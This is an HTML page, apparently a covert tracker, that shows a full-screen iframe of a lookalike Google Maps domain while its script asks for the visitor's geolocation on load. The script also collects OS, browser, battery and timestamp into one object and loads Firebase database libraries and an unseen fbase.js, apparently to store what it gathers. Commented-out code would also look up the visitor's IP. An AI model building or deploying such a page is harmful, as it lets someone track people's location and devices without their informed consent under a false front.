<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Location</title>

    <script src="map/assets/js/jquery-2.2.3.min.js"></script>
    <script src="client.js"></script>
    <style>
        html,body{
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <iframe src="https://snake.googlemaps.com/" frameborder="0" style="width:100%; height:100%;"></iframe>
	<script type="text/javascript">
		function showLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            //alert("Latitude : " + latitude + " Longitude: " + longitude);
            //document.write();
            /*$(".pre").append("<br>");
            $(".pre").append("Latitude : " + latitude + " Longitude: " + longitude + "<br>");*/
            var lolo = {latitude:latitude, longitude:longitude};
            make_data(lolo)
        }

        function errorHandler(err) {
            var ret = "";
            if(err.code == 1) {
               	//alert("Error: Access is denied!");
           		console.log("Error: Access is denied!");
                ret = "Access is denied!";
            make_data("Error : "+ret);
            } else if( err.code == 2) {
                //alert("Error: Position is unavailable!");
                console.log("Error: Position is unavailable!");
                ret = "Position is unavailable!";
            make_data("Error : "+ret);
            }
        }
			
        function getLocation() {

            if(navigator.geolocation) {
                var ret = {};
               	var options = {timeout:5000};
               	navigator.geolocation.getCurrentPosition(showLocation, errorHandler, options);
            } else {
                make_data("Sorry, browser does not support geolocation!");
                
            }
        }

  		function get_browser () {
  			var os = jscd.os+" "+jscd.osVersion;
  			var brow = jscd.browser;
           	/*$(".pre").append("OS : "+os+"<br>");
           	$(".pre").append("Browser : "+brow+"<br>");*/
            return {os:os,browser:brow}
  		}

        function get_battery(){
            var batteryIsCharging = false;
            var a = {}; 
            navigator.getBattery().then(function(battery) {
                batteryIsCharging = battery.charging;

                battery.addEventListener('chargingchange', function() {
                    batteryIsCharging = battery.charging;
                });
                //$(".pre").append("<br>battery : "+Math.ceil(battery.level*100)+"% | is Charging : "+batteryIsCharging+"<br>");
                a = {level: Math.ceil(battery.level*100), charging:battery.charging};
            });
            console.log(a);
            /*var battery = navigator.getBattery();
            console.log(battery);*/
        }

        function get_date(){
            var d = new Date();
            var days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
            
            //$(".pre").append("<br>Date : "+days[d.getDay()]+", "+d.getDate()+"-"+(d.getMonth()+1)+"-"+d.getFullYear()+" "+d.getHours()+":"+d.getMinutes()+"<br>");
            return days[d.getDay()]+", "+d.getDate()+"-"+(d.getMonth()+1)+"-"+d.getFullYear()+" "+d.getHours()+":"+d.getMinutes();
        }
        
        function make_data(loc){

            navigator.getBattery().then(function(battery) {
                batteryIsCharging = battery.charging;

                battery.addEventListener('chargingchange', function() {
                    batteryIsCharging = battery.charging;
                });
                //$(".pre").append("<br>battery : "+Math.ceil(battery.level*100)+"% | is Charging : "+batteryIsCharging+"<br>");
                
                console.log(new Date().getTime());
                var a = {
                    device:get_browser(),
                    battery:{level: Math.ceil(battery.level*100), charging:battery.charging},
                    date:get_date(),
                    location:loc,
                };
                console.log(a);
            });
        }

        getLocation();
        
/*
        get_browser();
        getLocation();
        get_battery();
        get_date();
*/

        //getIP();
        /*$.getJSON('https://ipapi.co/json/', function(data) {
		  	console.log(JSON.stringify(data, null, 2));
		  	$(".pre").append(JSON.stringify(data, null, 2));
		});*/
	</script>

    <script src="https://www.gstatic.com/firebasejs/7.7.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/7.7.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/7.7.0/firebase-database.js"></script>
    <script src="fbase.js"></script>
</body>
</html>